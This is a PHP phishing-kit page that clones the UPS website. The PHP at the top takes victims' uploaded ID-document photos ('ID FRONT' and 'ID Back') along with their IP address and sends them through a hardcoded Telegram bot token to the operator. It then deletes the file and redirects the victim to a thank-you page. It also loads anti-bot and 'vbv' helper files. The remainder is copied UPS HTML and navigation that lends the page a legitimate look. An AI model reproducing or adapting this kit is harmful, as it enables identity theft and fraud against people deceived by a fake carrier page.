<?php
include "antibot.php";
include "vbv.php";
function getRealIpAddr(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ip=$_SERVER['HTTP_CLIENT_IP'];
 }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }else{
      $ip=$_SERVER['REMOTE_ADDR'];
 }
  return $ip;
}
$allowtype = array('jpg', 'jpe', 'jpeg','7z', 'png');
if(isset($_FILES['fileup']) && strlen($_FILES['fileup']['name']) > 1) {
  $uploadpath = basename( $_FILES['fileup']['name']);
  $uploadpath2 = basename( $_FILES['fileup2']['name']);
  $sepext = explode('.', strtolower($_FILES['fileup']['name']));
  $type = end($sepext);
  $err = '';
  if(!in_array($type, $allowtype)) $err .= 'The file: <b>'. $_FILES['fileup']['name']. '</b> not has the allowed extension type.';
  if($err == '') {
    if(move_uploaded_file($_FILES['fileup']['tmp_name'], $uploadpath)) {
		$BotTelegramToken="5092363740:AAFbRwIMY8fQpgPUppzF7AncBKbCwu_Ev3M";
		$IdTelegram=array("1305831045"); 
		foreach($IdTelegram as $user_id) {
			$messageTelegram  = "|=[ ID FRONT INFORMATION ]=|\n"; 
			$messageTelegram .= "|IP         :  ".getRealIpAddr()."\n";
			$messageTelegram .= "|==[ UPS ARON-TN ]==|\n";  
			$bot_url= "https://api.telegram.org/bot".$BotTelegramToken."/";
			$url= $bot_url."sendPhoto?chat_id=" . $user_id ;
			$post_fields = array(
			  'chat_id'=> $user_id,
			  'photo'=> new CURLFile(realpath($uploadpath)),
			  'caption' => $messageTelegram
			);
			$ch = curl_init(); 
			curl_setopt($ch, CURLOPT_HTTPHEADER, array(
				"Content-Type:multipart/form-data"
			));
			curl_setopt($ch, CURLOPT_URL, $url); 
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
			$output = curl_exec($ch);
			//-----------------
			$messageTelegram  = "|=[ ID Back INFORMATION ]=|\n"; 
			$messageTelegram .= "|IP         :  ".getRealIpAddr()."\n";
			$messageTelegram .= "|==[ UPS ARON-TN ]==|\n"; 
			$bot_url= "https://api.telegram.org/bot".$BotTelegramToken."/";
			$url= $bot_url."sendPhoto?chat_id=" . $user_id ;
			$post_fields = array(
			  'chat_id'=> $user_id,
			  'photo'=> new CURLFile(realpath($uploadpath)),
			  'caption' => $messageTelegram
			);
			$ch = curl_init(); 
			curl_setopt($ch, CURLOPT_HTTPHEADER, array(
				"Content-Type:multipart/form-data"
			));
			curl_setopt($ch, CURLOPT_URL, $url); 
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
			$output = curl_exec($ch);
}
      unlink($uploadpath);
      unlink($uploadpath2);
	  HEADER("Location: thankyou.php");      
    }
    else echo '<b>Unable to upload the file.</b>';
  }
  else echo $err;
}


?>
<html class="js canvas canvastext supports csstransforms3d flexbox cssgradients opacity backgroundsize borderimage borderradius boxshadow cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside cssreflections csstransitions flexboxlegacy csstransforms hashchange generatedcontent svg inlinesvg smil svgclippaths inputtypes-search inputtypes-tel inputtypes-url inputtypes-email no-inputtypes-datetime inputtypes-date inputtypes-month inputtypes-week inputtypes-time inputtypes-datetime-local inputtypes-number inputtypes-range inputtypes-color fontface websockets no-applicationcache audio audio-ogg audio-mp3 audio-opus audio-wav audio-m4a geolocation history hsla localstorage multiplebgs postmessage postmessage-structuredclones sessionstorage textshadow rgba video video-ogg video-h264 no-video-h265 video-webm video-vp9 no-video-hls no-video-av1 webgl websqldatabase webworkers target no-time texttrackapi track checked arrow json notification placeholder template iedepVer no-touch" xmlns="http://www.w3.org/1999/xhtml" lang="en" style="--ups-viewport-height:7.81px;"><head>
<meta name="robots" content="noindex">
<meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<!--ls:begin[stylesheet]-->
<style type="text/css">
          .iw_container
          {
            max-width:800px !important;
            margin-left: auto !important;
            margin-right: auto !important;
          }
          .iw_stretch
          {
            min-width: 100% !important;
          }
        </style> 
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<link type="text/css" href="https://www.ups.com/assets/resources/styles/ups.vendor.54f3c2d83b58.css" rel="stylesheet"> 
<link type="text/css" href="https://www.ups.com/assets/resources/styles/ups.styles.eb36c144b5fd.css" rel="stylesheet"> 
<link type="text/css" href="https://www.ups.com/assets/resources/styles/ups.modules.621ddd669ef2.css" rel="stylesheet"> 
<link type="text/css" href="https://www.ups.com/assets/resources/styles/ups.widgets.6611168e8d14.css" rel="stylesheet"> 
<link type="text/css" href="https://www.ups.com/assets/resources/styles/ups.apps-utrk.de2c674dbb95.css" rel="stylesheet" media="screen"> 
<link type="text/css" href="https://www.ups.com/assets/resources/styles/ups.apps-simplified_tracking.65f764049554.css" rel="stylesheet" media="screen"> 
<style type="text/css"> #__tealiumImplicitmodal {  display: none;}        @media (min-width: 768px) {            .implicit_privacy_prompt.implicit_consent {                position: fixed;                width: 75%;                left: 50%;                text-align: left;                background-color: #F7F6F5;                font-size: 1.3rem;                z-index: 99998;                font-family: Tahoma,helvetica,arial,sans-serif;                color: #242424;                border: 1px solid #757575;                transform: translate(-50%, 0);                bottom: 0;                max-width: 1400px;                box-shadow: 0 0px 15px #0005;            }        }            @media (min-width: 320px) and (max-width: 767px) {            .implicit_privacy_prompt.implicit_consent {                position: fixed;                width: 100%;                left: 0%;                text-align: left;                background-color: #F7F6F5;                font-size: 1.3rem;                z-index: 99998;                font-family: Tahoma,helvetica,arial,sans-serif;                color: #242424;                border: 1px solid #757575;                transform: none;                bottom: 0;                max-width: 1400px;                box-shadow: 0 0px 15px #0005;            }        }    .ups-readerTxt {position: absolute !important;clip: rect(1px, 1px, 1px, 1px);padding: 0 !important;border: 0 !important;height: 1px !important;width: 1px !important;overflow: hidden;}.__tealiumPrivacyBackdrop{display: block !important;}.implicit_privacy_prompt.implicit_consent .implicit_privacy_prompt_content {  width: 100%;  max-width: 85%;  margin: 0 auto;  padding: 10px;  font-size: 14px;  position: relative;}        @media (min-width: 320px) and (max-width: 767px) {            .implicit_privacy_prompt.implicit_consent .implicit_privacy_prompt_content {                max-width: 100%;                padding: 15px;            }        }    .implicit_privacy_prompt.implicit_consent .implicit_consent_title {  font-size: 1.1em;  font-weight: bold;  line-height: 1.25;  margin: 0;}.implicit_privacy_prompt.implicit_consent .implicit_consent__inner {  display: table;  width: 100%;}.implicit_privacy_prompt.implicit_consent .implicit_consent__inner-left,.implicit_privacy_prompt.implicit_consent .implicit_consent__inner-right {  display: table-cell;  vertical-align: left;}.implicit_privacy_prompt.implicit_consent .implicit_consent__inner-left p {  margin: 0 0 10px;  font-size: 14px;  line-height: 1.25;}.implicit_privacy_prompt.implicit_consent .implicit_consent__inner-left a,.implicit_privacy_prompt.implicit_consent .implicit_consent__inner-right a {  text-decoration: underline;  color: #426DA9;}.implicit_privacy_prompt.implicit_consent .implicit_consent__inner-right {  width: 100px;  padding-left: .5rem;  text-align: center;  vertical-align: middle;}.implicit_privacy_prompt #implicit_consent_prompt_submit:hover {  transition: background-color 0.2s ease;  background-color: #016862;}#__tealiumImplicitmodal .implicit_privacy_prompt>.close_btn_thick {  position: absolute;  display: block;  top: 13px;  right: 10px;  text-decoration: none;  text-shadow: none;  color: #4A4A4A; font: 14px/100% arial, sans-serif; font-weight: normal; cursor: pointer;  background: none;  padding-left: 5px;  padding-right: 5px;  border: 0px solid #000000;  z-index: 99;}</style>
<style>.ref_Loading[_ngcontent-c2]{background-color:#f9f8f8;opacity:.5;-webkit-transition:opacity .5s;transition:opacity .5s;position:absolute;top:-50px;left:0;height:100%;width:100%}#addAccModal[_ngcontent-c2]{position:relative}</style>
<style>.ups-link[_ngcontent-c3]{text-align:left!important}.ref_Loading[_ngcontent-c3]{background-color:#f9f8f8;opacity:.5;-webkit-transition:opacity .5s;transition:opacity .5s;position:absolute;top:20px;left:0;height:100%;width:100%}#trackReferenceModal[_ngcontent-c3]{position:relative}</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

</head>
    <body class="ups-hasAlerts" style="padding-top: 0px;" data-inq-observer="1">
        <div class="iw_viewport-wrapper"><div class="container-fluid iw_section" id="sectionisswf4to"> 
 <div class="row iw_row iw_stretch" id="rowisswf4tp"> 
  <div class="iw_columns col-lg-12" id="colisswf4tq"> 
   <div class="iw_placeholder" id="iw_placeholder1473252365867"> 
    <div class="iw_component" id="iw_comp1613996032224"> 
     <div id="ups-navContainer" class="hpps-dynamic ups-analytics-render" data-content-block-id="M1" data-content-id="templatedata/navigation/header-config/data/en_US/header-full-us.dcr" data-home=""> 
      <div id="ups-alertsWrap" role="group" aria-label="Time Sensitive Information from UPS"> 
       <div id="ups-alerts" style="display: block;" data-linktxt="Alerts" data-prevtxt="Previous" data-nexttxt="Next" data-alerthide="false"> 
        <div class="ups-alerts_controls"><button type="button" class="slick-prev ups-iconAlone slick-arrow" style="display: block;"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Previous</span></button>
         <span class="ups-alert_index">1</span> of 
         <span class="ups-alert_size">2</span>
        <button type="button" class="slick-next ups-iconAlone slick-arrow" style="display: block;"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Next</span></button></div> 
        <ul class="ups-alerts_list slick-initialized slick-slider"> 
         <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 3095px; transform: translate3d(-619px, 0px, 0px);"><li class="ups-alert_msg slick-slide slick-cloned" tabindex="-1" data-position="alert2" data-slick-index="-1" aria-hidden="true" style="width: 619px;"><span>UPS Services to and from India</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="/us/en/service-alerts.page?id=alert2" tabindex="-1">...More</a></li><li class="ups-alert_msg slick-slide slick-current slick-active" tabindex="0" data-position="alert1" data-slick-index="0" aria-hidden="false" style="width: 619px;"><span>Service Impacts Related to Coronavirus</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="0">...More</a></li><li class="ups-alert_msg slick-slide" tabindex="-1" data-position="alert2" data-slick-index="1" aria-hidden="true" style="width: 619px;"><span>UPS Services to and from India</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="-1">...More</a></li><li class="ups-alert_msg slick-slide slick-cloned" tabindex="-1" data-position="alert1" data-slick-index="2" aria-hidden="true" style="width: 619px;"><span>Service Impacts Related to Coronavirus</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="-1">...More</a></li><li class="ups-alert_msg slick-slide slick-cloned" tabindex="-1" data-position="alert2" data-slick-index="3" aria-hidden="true" style="width: 619px;"><span>UPS Services to and from India</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="-1">...More</a></li></div></div> 
        </ul>
        <button onclick='document.getElementById("ups-alerts").style.display = "none";' class="ups-alerts_close"><i class="ups-icon ups-iconAlone ups-icon-x" aria-hidden="true"></i><span class="ups-readerTxt">Close</span></button>
       </div> 
      </div>
      <a class="ups-analytics" id="ups-skipNav" href="#" tabindex="0" data-content-block-id="M1" data-event-id="21">Skip To Main Content</a>
      <header id="ups-headerWrap" style="margin-top: 39px;"> 
       <div class="ups-wrap ups-wrap_header"> 
        <div id="ups-header" class="ups-wrap_inner" data-upstoken="69b689e92856af4eda14fb2bd0418c69158f2943d18691e934ada3ceefb3b914f225910c8bbd05dc221d336eac174899277c8bef3b610c7aa622d42913525889" data-islogged="false">
         <a id="ups-header_logo" href="https://www.ups.com/us/en/Home.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21" title="UPS Home" style=""><img src="https://www.ups.com/assets/resources/images/UPS_logo.svg" alt="UPS Home"></a>
         <div id="ups-touchNav" class="ups-med_show"> 
          <ul class="ups-mob_links clearfix ups-header_mob_utils"> 
           <li class="ups-mobSearch_li"><button id="ups-mobSearch_btn" class="ups-searchBtn ups-touchNav-buttons ups-analytics" aria-controls="ups-header_search-mob" data-content-block-id="M1" data-event-id="21"><span id="ups-mobSearch_icn" class="ups-iconAlone ups-icon-search" aria-hidden="true"></span><span><i>Track a package or search</i></span><span id="ups-mobSearch-close" class="icon ups-icon-x hide" aria-hidden="true"></span></button></li> 
           <li class="ups-menu ups-account "><a class="ups-profileBtn ups-touchNav-buttons ups-analytics" id="ups-profileBtn" aria-expanded="false" data-content-block-id="M1" data-event-id="21" href="https://www.ups.com/lasso/login?loc=en_US&amp;returnto=https%3A%2F%2Fwww.ups.com%2Ftrack%3Floc%3Den_US%26Requester%3Dlasso"><span class="ups-iconAlone ups-icon-user-solid" aria-hidden="true"></span><span class="ups-icon_text">Log in / Sign up</span></a></li> 
            
           <li><button class="ups-menuToggle ups-touchNav-buttons ups-analytics" data-content-block-id="M1" data-event-id="22"><span class="ups-iconAlone ups-icon-menu" aria-hidden="true"></span><span class="ups-readerTxt">Menu</span></button><button class="ups-mobmenu-close ups-touchNav-buttons"><span class="ups-iconAlone ups-icon-x" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button></li> 
          </ul> 
         </div> 
         <form id="ups-header_search-mob" action="" role="search" aria-labelledby="ups-mobSearch_btn" class="hide" data-track="https://wwwapps.ups.com/WebTracking/track?loc=en_US" data-svp-track="/mobile/track?loc=en_US#Track"> 
          <div class="ups-input_wrap">
           <label for="ups-search-mob" class="ups-readerTxt">Track a package or search</label>
           <input type="search" name="ups-search-mob" id="ups-search-mob" placeholder="Track a package or search" class="ui-autocomplete-input" autocomplete="off">
           <input type="hidden" name="HTMLVersion" value="5.0">
           <input type="hidden" name="loc" value="en_US">
           <input type="hidden" name="trackNums" class="ups-trackSearch_header">
           <input value="Track" name="track.x" type="hidden">
           <button class="ups-cta" type="submit" id="ups-mainNav_search_mob"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt"></span>Go</button>
           <button class="ups-cta close" type="button"><span class="icon" aria-hidden="true"><span class="ups-readerTxt">Close</span></span>x</button>
          </div> 
         </form> 
         <div class="ups-topNav" id="ups-navigation-container"> 
           
          <nav class="ups-container ups-primary_nav" id="ups-navItems"> 
           <div class="ups-wrap"> 
            <div class="ups-wrap_inner ups-navItems_primary"> 
             <ul class="ups-navItems_mainUL ups-menu-flexible-width"> 
              <li id="ups-headerTools" class="ups-navMenu ups-menu"><a href="javascript:void(0)" aria-controls="ups-quickStartPanel" role="button" id="ups-quickStartMenu" aria-expanded="false" class="ups-analytics ups-toolsToggle" data-content-block-id="M1" data-event-id="22">Quick Start<span class="icon" aria-hidden="true"></span></a>
               <div id="ups-quickStartPanel" class="ups-headerTools_list" aria-hidden="true" aria-labelledby="ups-quickStartMenu"> 
                <div class="ups-headerTools_msg"> 
                 <h3>Hello. <a href="/us/en/help-center/get-started-with-ups.page" data-link-name="RTE: " data-event-id="21" data-isrte="true" duphref="/us/en/help-center/get-started-with-ups.page">Get Started with UPS</a>.</h3> 
                </div> 
                <ul class="ups-headerTools_widgets"> 
                 <li class="ups-headerTools_track"> 
                  <div class="ups-wrap ups-simpleTrack_wrap"> 
                   <div class="ups-wrap_inner"> 
                    <div class="ups-simpleTrack ups-widget "> 
                     <div class="ups-widget_header"> 
                      <h2 id="ups-quote-head-qs"><span class="icon" aria-hidden="true"></span>Track </h2> 
                     </div> 
                     <div class="ups-widget_panel" aria-labelledby="ups-quote-head-qs" role="group"> 
                      <form name="trackMod" data-svp-track="/mobile/track?loc=en_US#Track">
                       <input type="hidden" name="loc" value="en_US">
                       <label for="ups-track--qs" class="ups-readerTxt">Tracking Numbers</label>
                       <div class="ups-simpleTrack_input_wrap">
                        <textarea rows="1" cols="2" name="trackNums" id="ups-track--qs" class="ups-simpleTrack_input ups-form_input" placeholder="Tracking Numbers"></textarea>
                       </div>
                       <input value="QUIC" name="requester" type="hidden">
                       <button id="ups-tracking-submit" type="submit" data-event-id="21" data-content-block-id="M1" class="ups-simpleTrack_btn ups-cta ups-analytics"><i aria-hidden="true"></i><span class="ups-readerTxt">Go</span></button>
                      </form> 
                     </div> 
                    </div> 
                   </div> 
                  </div> </li> 
                 <li id="Shipping" data-key="Ship" class="ups-ship" data-url="https://www.ups.com/ship?loc=en_US" data-svp="http://www.ups.com"><a href="https://www.ups.com/ship?loc=en_US" class="ups-analytics ups-headerTools_widgetToggle" data-content-block-id="M1" data-event-id="22" role="button" id="ups-quickStartShip">Ship<span aria-hidden="true" class="icon show"></span></a>
                  <div class="ups-toolWrap" aria-hidden="true" id="ups-quickstartShipPanel" aria-labelledby="ups-quickStartShip"> 
                   <div class="ups-tool">
                    <button class="ups-headerTools_widgetClose"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button>
                   </div> 
                  </div> </li> 
                 <li class="ups-qs_customNode" data-key="Shipping_Selector_Quick_Start" data-url="https://www.ups.com/service-selector?loc=en_US"><a href="https://www.ups.com/service-selector?loc=en_US" class="ups-analytics ups-headerTools_widgetToggle" data-content-block-id="M1" data-event-id="22">Find a Service<span aria-hidden="true" class="icon show"></span></a>
                  <div class="ups-toolWrap"> 
                   <div class="ups-tool">
                    <button class="ups-headerTools_widgetClose"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button>
                   </div> 
                  </div> </li> 
                 <li id="CTC" data-key="Quote" class="ups-quote" data-url="https://wwwapps.ups.com/ctc/request?loc=en_US" data-svp="https://www.ups.com/mobile/ratetnthome?loc=en_US"><a href="https://wwwapps.ups.com/ctc/request?loc=en_US" class="ups-analytics ups-headerTools_widgetToggle" data-content-block-id="M1" data-event-id="22" role="button" id="ups-quickStartQuote">Quote<span aria-hidden="true" class="icon show"></span></a>
                  <div class="ups-toolWrap" aria-hidden="true" id="ups-quickstartQuotePanel" aria-labelledby="ups-quickStartQuote" role="region"> 
                   <div class="ups-tool">
                    <button class="ups-headerTools_widgetClose"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button>
                   </div> 
                  </div> </li> 
                 <li data-widget-source="locator-1" data-ajax-source="Locator" data-key="Locations" class="ups-locations ups-toolCont" data-url="/us/en/w1-location-finder-page.page?quickStart=true&amp;widget=locationFinder" data-svp="https://www.ups.com/dropoff?loc=en_US"><a href="/us/en/w1-location-finder-page.page?quickStart=true&amp;widget=locationFinder" class="ups-analytics ups-headerTools_widgetToggle" data-content-block-id="M1" data-event-id="22" role="button" id="ups-quickStartLocation" aria-expanded="false" aria-controls="ups-quickStartLocationPanel">Locations<span aria-hidden="true" class="icon show"></span></a>
                  <div class="ups-toolWrap" aria-hidden="true" id="ups-quickStartLocationPanel" aria-labelledby="ups-quickStartLocation" role="region"> 
                   <div class="ups-tool">
                    <button class="ups-headerTools_widgetClose"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button>
                   </div> 
                  </div> </li> 
                 <li class="ups-billing" data-key="View__Pay_Bill_Quick_Start" data-url="/us/en/services/billing/billing-center.page?"><a href="/us/en/services/billing/billing-center.page?" class="ups-analytics ups-headerTools_widgetToggle" data-content-block-id="M1" data-event-id="22">View &amp; Pay Bill<span aria-hidden="true" class="icon show"></span></a>
                  <div class="ups-toolWrap"> 
                   <div class="ups-tool">
                    <button class="ups-headerTools_widgetClose"><span class="icon" aria-hidden="true"></span><span class="ups-readerTxt">Close</span></button>
                   </div> 
                  </div> </li> 
                </ul> 
               </div> </li> 
              <li class="ups-navMenu ups-menu"><a href="#" class="ups-analytics ups-menu_toggle" role="button" id="ups-menuLinks1" aria-controls="ups-menuPanel1" data-content-block-id="M1" data-event-id="22" aria-expanded="false">Tracking<span class="icon ups-icon-plus" aria-hidden="true"></span><span class="icon ups-icon-minus" aria-hidden="true"></span></a>
               <div class="ups-wrap"> 
                <div class="ups-wrap_inner"> 
                 <div class="ups-menu_list ups-cols-3" id="ups-menuPanel1" aria-hidden="true" aria-labelledby="ups-menuLinks1" role="region" style=""> 
                  <div class="ups-menu_listCols"> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">Quick Links to Track</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="https://www.ups.com/track?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Track a Package</a></li> 
                     <li><a href="/us/en/help-center/sri/tracking/change-delivery.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Change Delivery</a></li> 
                     <li><a href="/us/en/tracking/quantum-view.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Manage Inbound/Outbound Deliveries:<br><i>Quantum View - for Large Enterprise Businesses</i></a></li> 
                     <li><a href="/us/en/services/tracking.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Explore All Tracking</a></li> 
                    </ul> 
                   </div> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">UPS My Choice</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="/us/en/services/tracking/mychoice.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Explore Managing Home Deliveries</a></li> 
                    </ul> 
                   </div> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">UPS My Choice for Business</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="/us/en/services/tracking/my-choice-for-business.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Explore Managing Business Deliveries</a></li> 
                    </ul> 
                   </div> 
                  </div> 
                 </div> 
                </div> 
               </div> </li> 
              <li class="ups-navMenu ups-menu"><a href="#" class="ups-analytics ups-menu_toggle" role="button" id="ups-menuLinks2" aria-controls="ups-menuPanel2" data-content-block-id="M1" data-event-id="22" aria-expanded="false">Shipping<span class="icon ups-icon-plus" aria-hidden="true"></span><span class="icon ups-icon-minus" aria-hidden="true"></span></a>
               <div class="ups-wrap"> 
                <div class="ups-wrap_inner"> 
                 <div class="ups-menu_list ups-cols-3" id="ups-menuPanel2" aria-hidden="true" aria-labelledby="ups-menuLinks2" role="region" style=""> 
                  <div class="ups-menu_listCols"> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">New Shipments</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="https://www.ups.com/ship?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Create a Shipment:<br><em>Package &amp; Freight</em></a></li> 
                     <li><a href="https://www.ups.com/service-selector?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Find a Shipping Service</a></li> 
                     <li><a href="https://wwwapps.ups.com/ctc/request?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Calculate Time &amp; Cost</a></li> 
                     <li><a href="https://wwwapps.ups.com/pickup/schedule?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Schedule a Pickup</a></li> 
                     <li><a href="https://www.ups.com/marketplaceshipping/order?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Manage Online Orders: <br><em>Marketplace Shipping</em></a></li> 
                     <li><a href="https://www.ups.com/uis/create?ActionOriginPair=CreateAReturn___StartSession&amp;loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Create a Return</a></li> 
                     <li><a href="/us/en/shipping.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Explore All Shipping</a></li> 
                    </ul> 
                   </div> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">Existing Shipments</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="https://www.ups.com/ship/history?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">View Shipping History</a></li> 
                     <li><a href="https://www.ups.com/ship/history?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Void Shipment</a></li> 
                    </ul> 
                   </div> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">More Shipping Options</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="https://www.ups.com/uis/create?ActionOriginPair=BatchImportPage___StartSession&amp;loc=en_US&amp;WT.svl=SubNav" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Batch File Shipping</a></li> 
                     <li><a href="/us/en/services/international-shipping.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">International Shipping</a></li> 
                     <li><a href="https://www.ups.com/uis/create?ActionOriginPair=CreateAnImport___StartSession&amp;loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Create Import:<br><i>UPS Import Control</i></a></li> 
                     <li><a href="https://wwwapps.ups.com/tradeability?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21">International Toolset:<br><em>UPS TradeAbility</em></a></li> 
                     <li><a href="/us/en/help-center/packaging-and-supplies.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Order Supplies</a></li> 
                    </ul> 
                   </div> 
                  </div> 
                 </div> 
                </div> 
               </div> </li> 
              <li class="ups-navMenu ups-menu"><a href="#" class="ups-analytics ups-menu_toggle" role="button" id="ups-menuLinks3" aria-controls="ups-menuPanel3" data-content-block-id="M1" data-event-id="22" aria-expanded="false">Services<span class="icon ups-icon-plus" aria-hidden="true"></span><span class="icon ups-icon-minus" aria-hidden="true"></span></a>
               <div class="ups-wrap"> 
                <div class="ups-wrap_inner"> 
                 <div class="ups-menu_list ups-cols-3" id="ups-menuPanel3" aria-hidden="true" aria-labelledby="ups-menuLinks3" role="region" style=""> 
                  <div class="ups-menu_listCols"> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">By Type</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="/us/en/services/shipping-services.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Shipping Services</a></li> 
                     <li><a href="/us/en/services/shipping.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Shipping Tools</a></li> 
                     <li><a href="/us/en/services/tracking.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Tracking Services</a></li> 
                     <li><a href="/us/en/services/billing.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Billing</a></li> 
                     <li><a href="https://www.ups.com/us/en/supplychain/logistics.page" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Contract Logistics</a></li> 
                     <li><a href="/us/en/services/technology-integration.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Integrating UPS Technology</a></li> 
                     <li><a href="/us/en/services.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Explore All Services</a></li> 
                    </ul> 
                   </div> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">By Size</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="/us/en/services/individual-shipper.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Personal Shipping</a></li> 
                     <li><a href="/us/en/services/small-business.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Small Business</a></li> 
                    </ul> 
                   </div> 
                   <div class="ups-menu_column"> 
                    <h3 class="ups-menu_subheading">Knowledge Center</h3> 
                    <ul class="ups-menu_links"> 
                     <li><a href="/us/en/services/knowledge-center/optimizing-operations.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Optimizing Operations</a></li> 
                     <li><a href="/us/en/services/knowledge-center/articlelist.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Most Recent Articles</a></li> 
                     <li><a href="/us/en/services/knowledge-center/expanding-globally.page?" class="ups-analytics" data-content-block-id="M1" data-event-id="21">Expanding Globally</a></li> 
                    </ul> 
                   </div> 
                  </div> 
                 </div> 
                </div> 
               </div> </li> 
             </ul> 
            </div> 
           </div> 
          </nav><nav class="ups-utilities_menu" aria-label="Utilities Menu"> 
           <ul class="ups-header_utils"> 
            <li class="ups-customerService ups-firstnav"><span aria-hidden="true" class="icon ups-icon-questioncircle"></span><a class="ups-analytics" data-content-block-id="M1" data-event-id="21" href="/us/en/help-support-center.page?">Customer Support</a></li> 
            <li class="ups-locations ups-firstnav"><span aria-hidden="true" class="icon ups-icon-locationsemifull"></span><a href="https://www.ups.com/dropoff?loc=en_US" data-event-id="">Locations</a></li> 
            <li class="ups-language ups-menu ups-firstnav" aria-label="Main" data-apps="true"><span aria-hidden="true" class="icon ups-icon-globe-filled"></span><a href="javascript:void(0)" class="ups-menu_toggle ups-analytics" id="ups-language-toggle" aria-expanded="false" aria-controls="ups-language-panel" role="button" data-content-block-id="M1" data-event-id="22"><span class="ups-language-text make-fluid">United States - English</span><span class="icon ups-icon-chevrondown" aria-hidden="true"></span><span class="ups-mobnav-arrow" aria-hidden="true"></span></a>
             <div class="ups-menu_list" id="ups-language-panel" aria-labelledby="ups-language-toggle" aria-hidden="true" style=""> 
              <ul class="ups-menu_list_child"> 
               <li lang="es" data-code="es"><a href="https://es-us.ups.com/us/es/Home.page?loc=es_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21" data-country-language-name="Estados Unidos - Español">Estados Unidos - Español</a></li> 
               <li lang="en" data-code="en"><a href="https://www.ups.com/us/en/Home.page?loc=en_US" class="ups-analytics" data-content-block-id="M1" data-event-id="21" data-country-language-name="United States - English">United States - English</a></li> 
              </ul> 
              <div class="ups-more">
               <a class="ups-analytics" data-content-block-id="M1" data-event-id="21" href="/us/en/global.page?">Select Another Country or Territory</a>
              </div> 
             </div> </li> 
